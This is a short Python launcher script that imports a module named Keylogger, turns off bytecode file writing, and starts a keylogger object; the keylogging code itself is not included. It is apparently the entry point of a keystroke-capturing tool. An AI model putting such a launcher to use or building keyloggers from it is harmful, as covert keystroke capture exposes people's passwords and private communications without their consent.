#! /usr/bin/env python

import Keylogger
import sys

sys.dont_write_bytecode=True
keylogger = Keylogger.Keylogger()
keylogger.start()